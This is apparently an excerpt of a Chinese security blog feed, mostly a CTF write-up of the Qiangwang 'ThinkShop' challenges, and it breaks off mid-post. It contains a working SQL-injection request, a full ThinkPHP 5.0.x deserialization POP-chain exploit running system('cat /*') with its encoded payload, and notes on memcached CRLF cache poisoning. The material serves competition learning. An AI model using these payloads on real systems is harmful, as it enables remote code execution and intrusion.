class="headerlink" title="结语"></a>结语</h2><p>最后的最后，2023也圆满结束，接下来的24年就是独当一面了，要去实习，要卷Java，要提升自己的一切，不能再以一点点的金钱而被蒙蔽了，还是需要花更多的时间和更加专注的精力放在安全技术上，希望24年能够顺顺利利吧，最后找到一份心仪的工作捏，当然了，当自己的兴趣转变成工作的时候，还是需要克服很多很多的困难的，在未来的道路上还是需要坚持，努力！</p><p>‍</p>]]></content>
    
    
    <categories>
      
      <category>总结</category>
      
    </categories>
    
    
    <tags>
      
      <tag>总结</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>CTF - 再谈强网ThinkShop</title>
    <link href="/post/ctf-talking-about-the-strong-network-thinkshop-z1xtoji.html"/>
    <url>/post/ctf-talking-about-the-strong-network-thinkshop-z1xtoji.html</url>
    
    <content type="html"><![CDATA[<p>‍</p><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>这里把强网的ThinkShop再抓出来好好说说，因为这应该算是比较有意思的题目了(<del>没做出来当时(就第一题有思路了)</del> )，这里先@datou爷，参考了他写的WP，我哭死咋这么强</p><p>‍</p><h1 id="ThinkShop"><a href="#ThinkShop" class="headerlink" title="ThinkShop"></a>ThinkShop</h1><p>给了镜像，直接查看源码</p><p>其实只要关注这些即可</p><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202312281514229.png" alt="image">​</p><h2 id="登录"><a href="#登录" class="headerlink" title="登录"></a>登录</h2><p>发现是存在Admin的路由的，说明是需要登录的，因为给了docker所以直接去docker的mysql中去查看账号密码即可</p><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202312281514545.png" alt="image">​</p><p>‍</p><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202312281514642.png" alt="image">​</p><p>但是直接输入admin 123456死活登录不进去</p><p>那就只能去查看登录逻辑了</p><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202312281514761.png" alt="image">​</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$adminData</span> = <span class="hljs-title class_">Db</span>::<span class="hljs-title function_ invoke__">table</span>(<span class="hljs-string">&#x27;admin&#x27;</span>)<br>    -&gt;<span class="hljs-title function_ invoke__">cache</span>(<span class="hljs-literal">true</span>, <span class="hljs-variable">$Expire</span>)<br>    -&gt;<span class="hljs-title function_ invoke__">find</span>(<span class="hljs-variable">$username</span>);<br></code></pre></td></tr></table></figure><p>这段代码的意思就是从<code>admin</code>​表中通过<code>find</code>​方法查询<code>$username</code>​并且把查询的结果放入缓存当中，那么在这个地方我们就要注意了，TP的<code>find</code>​方法是有一些限制的</p><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202312281514596.png" alt="image">​</p><p>所以也就解释了为什么一开始一直输入 admin 123456不可行原因</p><p>‍</p><h2 id="注入反序列化"><a href="#注入反序列化" class="headerlink" title="注入反序列化"></a>注入反序列化</h2><p>在登录成功之前其实我们也可以发现，在mysql中还存在一个表叫<code>goods</code>​</p><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202312281514695.png" alt="image">​</p><p>发现他的<code>data</code>​这个字段中的数据是很长的base64</p><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202312281514886.png" alt="image">​</p><p>一看就知道是序列化的base64的值，所以其实在这里就有暗示可能是要打反序列化了(但是我们如何把我们序列化的字节序列放入<code>data</code>​字段呢)</p><p>‍</p><p>在这里有一个小技巧，就是如果是TP的docker的话可以给他开启<code>debug</code>​模式然后并且把sql语句进行打印出来可以更好的查看sql语句的执行</p><p>修改文件在： <code>/var/www/html/application/config.php</code>​  修改为<code>&#39;app_debug&#39;              =&gt; true</code>​</p><p>‍</p><p>那么我们继续想如何把我们的字节序列加入数据库当中的<code>data</code>​字段中呢，我们可以想到是sql注入，所以我们现在就要去找一个sql注入的点(其实他这里的参数都没有进行sql的过滤并且都是直接拼接的所以基本上都可以直接注入)但是又因为咱需要更新他的<code>data</code>​的内容所以直接从<code>update</code>​这个方法中去注入即可</p><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202312281514136.png" alt="image">​</p><p>‍</p><p>可以在这里在docker当中加入<code>echo $sql;</code>​来查看sql语句，那么我们在哪里触发这个<code>updatedata</code>​ 呢，可以找到</p><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202312281514311.png" alt="image">​</p><p>然后再往上找</p><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202312281514413.png" alt="image">​</p><p>在往上找</p><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202312281514507.png" alt="image">​</p><p>发现是进行商品更新的地方，那么我们登录之后就可以看到商品登录的接口了</p><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202312281514665.png" alt="image">然后我们增加多一个<code>key</code>​来进行注入</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">id<span class="hljs-operator">=</span><span class="hljs-number">132</span><span class="hljs-operator">&amp;</span>name<span class="hljs-operator">=</span>test<span class="hljs-operator">&amp;</span>price<span class="hljs-operator">=</span><span class="hljs-number">100.00</span><span class="hljs-operator">&amp;</span>on_sale_time<span class="hljs-operator">=</span><span class="hljs-number">2023</span><span class="hljs-number">-12</span><span class="hljs-number">-19</span>T11:<span class="hljs-number">11</span><span class="hljs-operator">&amp;</span>image<span class="hljs-operator">=</span>test<span class="hljs-operator">&amp;</span>data<span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-operator">&amp;</span>data`<span class="hljs-operator">%</span><span class="hljs-number">3</span>D<span class="hljs-string">&#x27;qqq&#x27;</span><span class="hljs-keyword">where</span>`id`<span class="hljs-operator">%</span><span class="hljs-number">3</span>D132<span class="hljs-operator">%</span><span class="hljs-number">23</span><span class="hljs-operator">=</span>test<br></code></pre></td></tr></table></figure><p>这里有个要注意的点，在POST传参中如果要把我们的 <span style="font-weight: bold;" data-type="strong">&#x3D;</span> 写入到数据库中记得URL编码一下写成<code>%3D</code>​否则直接写 <span style="font-weight: bold;" data-type="strong">&#x3D;</span> 是不会当成sql语句的</p><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202312281514154.png" alt="image">​</p><p>那么现在可以修改<code>data</code>​的值了就可以写入序列化的字符序列了</p><p>那么其实分析到现在我们还没有找触发反序列化的入口在哪里，因为从sql当中知道是<code>Data</code>​字段，那么去找上传这个的参数的地方即可</p><p>我们可以从<code>goods_edit.html</code>​中找到以下代码</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">textarea</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;form-control&quot;</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;data&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;data&quot;</span> <span class="hljs-attr">rows</span>=<span class="hljs-string">&quot;3&quot;</span> <span class="hljs-attr">required</span>&gt;</span>&#123;php&#125;use app\index\model\Goods;$view=new Goods();echo $view-&gt;arrayToMarkdown(unserialize(base64_decode($goods[&#x27;data&#x27;])));&#123;/php&#125;<span class="hljs-tag">&lt;/<span class="hljs-name">textarea</span>&gt;</span><br></code></pre></td></tr></table></figure><p>那么我们来看看这个<code>$goods[&#39;data&#39;]</code>​是否可控</p><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202312281514752.png" alt="image">​</p><p>仔细查看<code>markdownToArray</code>​方法，其实可以发现只要不是<code>markdown</code>​就没有啥操作了</p><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202312281514951.png" alt="image">​</p><p>‍</p><p>然后就是把我们传入的内容直接作为数组返回而已</p><p>‍</p><p>但是这里还有个小问题 就是从刚开始对<code>data</code>​数据的解密和以下代码可以发现，他的序列化的值还得多包一层数组来进行绕过</p><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202312281514113.png" alt="image">​</p><p>‍</p><p>最后就是引用下文的5.0.x的反序列化文件并且通过数组包裹后的exp</p><p><a href="https://blog.csdn.net/LYJ20010728/article/details/119793016">ThinkPHP5.0.x 反序列化_5.0.21 thinkphp 反序列化-CSDN博客</a></p><p>这里抄了一波大头爷的exp</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">namespace</span> <span class="hljs-title class_">think</span>\<span class="hljs-title class_">process</span>\<span class="hljs-title class_">pipes</span>&#123;<br>    <span class="hljs-title class_">use</span> <span class="hljs-title class_">think</span>\<span class="hljs-title class_">model</span>\<span class="hljs-title class_">Pivot</span>;<br>    <span class="hljs-title function_ invoke__">ini_set</span>(<span class="hljs-string">&#x27;display_errors&#x27;</span>,<span class="hljs-number">1</span>);<br>    <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Windows</span></span>&#123;<br>        <span class="hljs-keyword">private</span> <span class="hljs-variable">$files</span> = [];<br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$function</span>,<span class="hljs-variable">$parameter</span></span>)</span><br><span class="hljs-function">        </span>&#123;<br>            <span class="hljs-variable language_">$this</span>-&gt;files = [<span class="hljs-keyword">new</span> <span class="hljs-title class_">Pivot</span>(<span class="hljs-variable">$function</span>,<span class="hljs-variable">$parameter</span>)];<br>        &#125;<br>    &#125;<br>    <span class="hljs-variable">$a</span> = <span class="hljs-keyword">array</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Windows</span>(<span class="hljs-string">&#x27;system&#x27;</span>,<span class="hljs-string">&#x27;cat /*&#x27;</span>));<br>    <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">bin2hex</span>(<span class="hljs-title function_ invoke__">base64_encode</span>(<span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$a</span>)));<br>&#125;<br><span class="hljs-keyword">namespace</span> <span class="hljs-title class_">think</span>&#123;<br>    <span class="hljs-title class_">abstract</span> <span class="hljs-title class_">class</span> <span class="hljs-title class_">Model</span><br>    &#123;&#125;<br>&#125;<br><span class="hljs-title class_">namespace</span> <span class="hljs-title class_">think</span>\<span class="hljs-title class_">model</span>&#123;<br>    <span class="hljs-title class_">use</span> <span class="hljs-title class_">think</span>\<span class="hljs-title class_">Model</span>;<br>    <span class="hljs-keyword">use</span> <span class="hljs-title">think</span>\<span class="hljs-title">console</span>\<span class="hljs-title">Output</span>;<br>    <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Pivot</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">Model</span></span><br><span class="hljs-class">    </span>&#123;<br>        <span class="hljs-keyword">protected</span> <span class="hljs-variable">$append</span> = [];<br>        <span class="hljs-keyword">protected</span> <span class="hljs-variable">$error</span>;<br>        <span class="hljs-keyword">public</span> <span class="hljs-variable">$parent</span>;<br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$function</span>,<span class="hljs-variable">$parameter</span></span>)</span><br><span class="hljs-function">        </span>&#123;<br>            <span class="hljs-variable language_">$this</span>-&gt;append[<span class="hljs-string">&#x27;jelly&#x27;</span>] = <span class="hljs-string">&#x27;getError&#x27;</span>;<br>            <span class="hljs-variable language_">$this</span>-&gt;error = <span class="hljs-keyword">new</span> relation\<span class="hljs-title function_ invoke__">BelongsTo</span>(<span class="hljs-variable">$function</span>,<span class="hljs-variable">$parameter</span>);<br>            <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-built_in">parent</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Output</span>(<span class="hljs-variable">$function</span>,<span class="hljs-variable">$parameter</span>);<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">abstract</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Relation</span></span><br><span class="hljs-class">    </span>&#123;&#125;<br>&#125;<br><span class="hljs-keyword">namespace</span> <span class="hljs-title class_">think</span>\<span class="hljs-title class_">model</span>\<span class="hljs-title class_">relation</span>&#123;<br>    <span class="hljs-title class_">use</span> <span class="hljs-title class_">think</span>\<span class="hljs-title class_">db</span>\<span class="hljs-title class_">Query</span>;<br>    <span class="hljs-keyword">use</span> <span class="hljs-title">think</span>\<span class="hljs-title">model</span>\<span class="hljs-title">Relation</span>;<br>    <span class="hljs-keyword">abstract</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">OneToOne</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">Relation</span></span><br><span class="hljs-class">    </span>&#123;&#125;<br>    <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">BelongsTo</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">OneToOne</span></span><br><span class="hljs-class">    </span>&#123;<br>        <span class="hljs-keyword">protected</span> <span class="hljs-variable">$selfRelation</span>;<br>        <span class="hljs-keyword">protected</span> <span class="hljs-variable">$query</span>;<br>        <span class="hljs-keyword">protected</span> <span class="hljs-variable">$bindAttr</span> = [];<br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$function</span>,<span class="hljs-variable">$parameter</span></span>)</span><br><span class="hljs-function">        </span>&#123;<br>            <span class="hljs-variable language_">$this</span>-&gt;selfRelation = <span class="hljs-literal">false</span>;<br>            <span class="hljs-variable language_">$this</span>-&gt;query = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Query</span>(<span class="hljs-variable">$function</span>,<span class="hljs-variable">$parameter</span>);<br>            <span class="hljs-variable language_">$this</span>-&gt;bindAttr = [<span class="hljs-string">&#x27;&#x27;</span>];<br>        &#125;<br>    &#125;<br>&#125;<br><span class="hljs-keyword">namespace</span> <span class="hljs-title class_">think</span>\<span class="hljs-title class_">db</span>&#123;<br>    <span class="hljs-title class_">use</span> <span class="hljs-title class_">think</span>\<span class="hljs-title class_">console</span>\<span class="hljs-title class_">Output</span>;<br>    <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Query</span></span><br><span class="hljs-class">    </span>&#123;<br>        <span class="hljs-keyword">protected</span> <span class="hljs-variable">$model</span>;<br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$function</span>,<span class="hljs-variable">$parameter</span></span>)</span><br><span class="hljs-function">        </span>&#123;<br>            <span class="hljs-variable language_">$this</span>-&gt;model = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Output</span>(<span class="hljs-variable">$function</span>,<span class="hljs-variable">$parameter</span>);<br>        &#125;<br>    &#125;<br>&#125;<br><span class="hljs-keyword">namespace</span> <span class="hljs-title class_">think</span>\<span class="hljs-title class_">console</span>&#123;<br>    <span class="hljs-title class_">use</span> <span class="hljs-title class_">think</span>\<span class="hljs-title class_">session</span>\<span class="hljs-title class_">driver</span>\<span class="hljs-title class_">Memcache</span>;<br>    <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Output</span></span><br><span class="hljs-class">    </span>&#123;<br>        <span class="hljs-keyword">protected</span> <span class="hljs-variable">$styles</span> = [];<br>        <span class="hljs-keyword">private</span> <span class="hljs-variable">$handle</span>;<br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$function</span>,<span class="hljs-variable">$parameter</span></span>)</span><br><span class="hljs-function">        </span>&#123;<br>            <span class="hljs-variable language_">$this</span>-&gt;styles = [<span class="hljs-string">&#x27;getAttr&#x27;</span>];<br>            <span class="hljs-variable language_">$this</span>-&gt;handle = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Memcache</span>(<span class="hljs-variable">$function</span>,<span class="hljs-variable">$parameter</span>);<br>        &#125;<br>    &#125;<br>&#125;<br><span class="hljs-keyword">namespace</span> <span class="hljs-title class_">think</span>\<span class="hljs-title class_">session</span>\<span class="hljs-title class_">driver</span>&#123;<br>    <span class="hljs-title class_">use</span> <span class="hljs-title class_">think</span>\<span class="hljs-title class_">cache</span>\<span class="hljs-title class_">driver</span>\<span class="hljs-title class_">Memcached</span>;<br>    <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Memcache</span></span><br><span class="hljs-class">    </span>&#123;<br>        <span class="hljs-keyword">protected</span> <span class="hljs-variable">$handler</span> = <span class="hljs-literal">null</span>;<br>        <span class="hljs-keyword">protected</span> <span class="hljs-variable">$config</span>  = [<br>            <span class="hljs-string">&#x27;expire&#x27;</span>       =&gt; <span class="hljs-string">&#x27;&#x27;</span>,<br>            <span class="hljs-string">&#x27;session_name&#x27;</span> =&gt; <span class="hljs-string">&#x27;&#x27;</span>,<br>        ];<br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$function</span>,<span class="hljs-variable">$parameter</span></span>)</span><br><span class="hljs-function">        </span>&#123;<br>            <span class="hljs-variable language_">$this</span>-&gt;handler = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Memcached</span>(<span class="hljs-variable">$function</span>,<span class="hljs-variable">$parameter</span>);<br>        &#125;<br>    &#125;<br>&#125;<br><span class="hljs-keyword">namespace</span> <span class="hljs-title class_">think</span>\<span class="hljs-title class_">cache</span>\<span class="hljs-title class_">driver</span>&#123;<br>    <span class="hljs-title class_">use</span> <span class="hljs-title class_">think</span>\<span class="hljs-title class_">Request</span>;<br>    <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Memcached</span></span><br><span class="hljs-class">    </span>&#123;<br>        <span class="hljs-keyword">protected</span> <span class="hljs-variable">$handler</span>;<br>        <span class="hljs-keyword">protected</span> <span class="hljs-variable">$options</span> = [];<br>        <span class="hljs-keyword">protected</span> <span class="hljs-variable">$tag</span>;<br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$function</span>,<span class="hljs-variable">$parameter</span></span>)</span><br><span class="hljs-function">        </span>&#123;<br>            <span class="hljs-comment">// pop链中需要prefix存在，否则报错</span><br>            <span class="hljs-variable language_">$this</span>-&gt;options = [<span class="hljs-string">&#x27;prefix&#x27;</span>   =&gt; <span class="hljs-string">&#x27;jelly/&#x27;</span>];<br>            <span class="hljs-variable language_">$this</span>-&gt;tag = <span class="hljs-literal">true</span>;<br>            <span class="hljs-variable language_">$this</span>-&gt;handler = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Request</span>(<span class="hljs-variable">$function</span>,<span class="hljs-variable">$parameter</span>);<br>        &#125;<br>    &#125;<br>&#125;<br><span class="hljs-keyword">namespace</span> <span class="hljs-title class_">think</span>&#123;<br>    <span class="hljs-title class_">class</span> <span class="hljs-title class_">Request</span><br>    &#123;<br>        <span class="hljs-title class_">protected</span> $<span class="hljs-title class_">get</span>     = [];<br>        <span class="hljs-keyword">protected</span> <span class="hljs-variable">$filter</span>;<br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$function</span>,<span class="hljs-variable">$parameter</span></span>)</span><br><span class="hljs-function">        </span>&#123;<br>            <span class="hljs-variable language_">$this</span>-&gt;filter = <span class="hljs-variable">$function</span>;<br>            <span class="hljs-variable language_">$this</span>-&gt;get = [<span class="hljs-string">&quot;jelly&quot;</span>=&gt;<span class="hljs-variable">$parameter</span>];<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>‍</p><p>然后通过刚才的注入报文写入<code>data</code>​数据即可</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">id<span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-operator">&amp;</span>name<span class="hljs-operator">=</span>test<span class="hljs-operator">&amp;</span>price<span class="hljs-operator">=</span><span class="hljs-number">100.00</span><span class="hljs-operator">&amp;</span>on_sale_time<span class="hljs-operator">=</span><span class="hljs-number">2023</span><span class="hljs-number">-12</span><span class="hljs-number">-19</span>T11:<span class="hljs-number">11</span><span class="hljs-operator">&amp;</span>image<span class="hljs-operator">=</span>test<span class="hljs-operator">&amp;</span>data<span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-operator">&amp;</span>data`<span class="hljs-operator">%</span><span class="hljs-number">3</span>D<span class="hljs-string">&#x27;YToxOntpOjA7TzoyNzoidGhpbmtccHJvY2Vzc1xwaXBlc1xXaW5kb3dzIjoxOntzOjM0OiIAdGhpbmtccHJvY2Vzc1xwaXBlc1xXaW5kb3dzAGZpbGVzIjthOjE6e2k6MDtPOjE3OiJ0aGlua1xtb2RlbFxQaXZvdCI6Mzp7czo5OiIAKgBhcHBlbmQiO2E6MTp7czo1OiJqZWxseSI7czo4OiJnZXRFcnJvciI7fXM6ODoiACoAZXJyb3IiO086MzA6InRoaW5rXG1vZGVsXHJlbGF0aW9uXEJlbG9uZ3NUbyI6Mzp7czoxNToiACoAc2VsZlJlbGF0aW9uIjtiOjA7czo4OiIAKgBxdWVyeSI7TzoxNDoidGhpbmtcZGJcUXVlcnkiOjE6e3M6ODoiACoAbW9kZWwiO086MjA6InRoaW5rXGNvbnNvbGVcT3V0cHV0IjoyOntzOjk6IgAqAHN0eWxlcyI7YToxOntpOjA7czo3OiJnZXRBdHRyIjt9czoyODoiAHRoaW5rXGNvbnNvbGVcT3V0cHV0AGhhbmRsZSI7TzoyOToidGhpbmtcc2Vzc2lvblxkcml2ZXJcTWVtY2FjaGUiOjI6e3M6MTA6IgAqAGhhbmRsZXIiO086Mjg6InRoaW5rXGNhY2hlXGRyaXZlclxNZW1jYWNoZWQiOjM6e3M6MTA6IgAqAGhhbmRsZXIiO086MTM6InRoaW5rXFJlcXVlc3QiOjI6e3M6NjoiACoAZ2V0IjthOjE6e3M6NToiamVsbHkiO3M6NjoiY2F0IC8qIjt9czo5OiIAKgBmaWx0ZXIiO3M6Njoic3lzdGVtIjt9czoxMDoiACoAb3B0aW9ucyI7YToxOntzOjY6InByZWZpeCI7czo2OiJqZWxseS8iO31zOjY6IgAqAHRhZyI7YjoxO31zOjk6IgAqAGNvbmZpZyI7YToyOntzOjY6ImV4cGlyZSI7czowOiIiO3M6MTI6InNlc3Npb25fbmFtZSI7czowOiIiO319fX1zOjExOiIAKgBiaW5kQXR0ciI7YToxOntpOjA7czowOiIiO319czo2OiJwYXJlbnQiO086MjA6InRoaW5rXGNvbnNvbGVcT3V0cHV0IjoyOntzOjk6IgAqAHN0eWxlcyI7YToxOntpOjA7czo3OiJnZXRBdHRyIjt9czoyODoiAHRoaW5rXGNvbnNvbGVcT3V0cHV0AGhhbmRsZSI7TzoyOToidGhpbmtcc2Vzc2lvblxkcml2ZXJcTWVtY2FjaGUiOjI6e3M6MTA6IgAqAGhhbmRsZXIiO086Mjg6InRoaW5rXGNhY2hlXGRyaXZlclxNZW1jYWNoZWQiOjM6e3M6MTA6IgAqAGhhbmRsZXIiO086MTM6InRoaW5rXFJlcXVlc3QiOjI6e3M6NjoiACoAZ2V0IjthOjE6e3M6NToiamVsbHkiO3M6NjoiY2F0IC8qIjt9czo5OiIAKgBmaWx0ZXIiO3M6Njoic3lzdGVtIjt9czoxMDoiACoAb3B0aW9ucyI7YToxOntzOjY6InByZWZpeCI7czo2OiJqZWxseS8iO31zOjY6IgAqAHRhZyI7YjoxO31zOjk6IgAqAGNvbmZpZyI7YToyOntzOjY6ImV4cGlyZSI7czowOiIiO3M6MTI6InNlc3Npb25fbmFtZSI7czowOiIiO319fX19fX0%3D&#x27;</span><span class="hljs-keyword">where</span>`id`<span class="hljs-operator">%</span><span class="hljs-number">3</span>D1<span class="hljs-operator">%</span><span class="hljs-number">23</span><span class="hljs-operator">=</span>test<br></code></pre></td></tr></table></figure><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202312281514214.png" alt="image">​</p><h1 id="ThinkShopping"><a href="#ThinkShopping" class="headerlink" title="ThinkShopping"></a>ThinkShopping</h1><p>这个题做了一些修改</p><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202312281514747.png" alt="image">​</p><p>修改完之后我们先看看修改的内容 其实可以发现他把入口的反序列化点给删除了相反代替的就是echo了一个<code>data</code>​的值</p><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202312281514843.png" alt="image">​</p><p>‍</p><p>再来查看一下他根目录起的环境是什么</p><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202312281514093.png" alt="image">​</p><p>前面是常规的apache+mysql+php 但是在最后一行发现了一个这个</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">memcached -d -m 50 -p 11211 -u root<br></code></pre></td></tr></table></figure><p>那么其实是存在考核点的</p><p>‍</p><p>最后(<del>看wp</del>)还是有其他修改过的痕迹</p><p>admin的表里面为空了</p><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202312281514188.png" alt="image">​</p><p>mysql的<code>secure_file_priv</code>​为空了</p><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202312281514277.png" alt="image">​</p><p>‍</p><p>那么前边的sql的点依旧没有删，所以思路就是 进入后台并且通过sql去使用<code>load_file</code>​去读取根目录的flag，但如何进入后台呢？前面提到，容器在启动的时候使用了<code>memcached</code>​,其实这里也是我一开始对<code>thinkshop</code>​有点不太理解的地方(这里贴上跟@up哥的聊天记录)</p><p><img src="C:\Users\Zachariah.Jack\Desktop\tmp_wp_picture\202312281537864-17037490613704.png"></p><p>其实这里确实就是这样，<code>find(xx)</code>​会先去<code>cache</code>​获取缓存，断点跟进下<code>find</code>​</p><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202312281514530.png" alt="image">​</p><p>发现是以<code>think:shop.admin|username</code>​ 这种形式去获取我们的值，那也就是说，如果我们能伪造一个缓存为admin admin 那么就可以登录后台了吧，由于出题人配置了cache，所以会将数据缓存到<code>memcached</code>​中</p><p>那么如何控制缓存的值呢？memcached存在CRLF注入漏洞，具体可参考下方文章：</p><ul><li><a href="https://www.freebuf.com/vuls/328384.html">https://www.freebuf.com/vuls/328384.html</a></li></ul><p><img 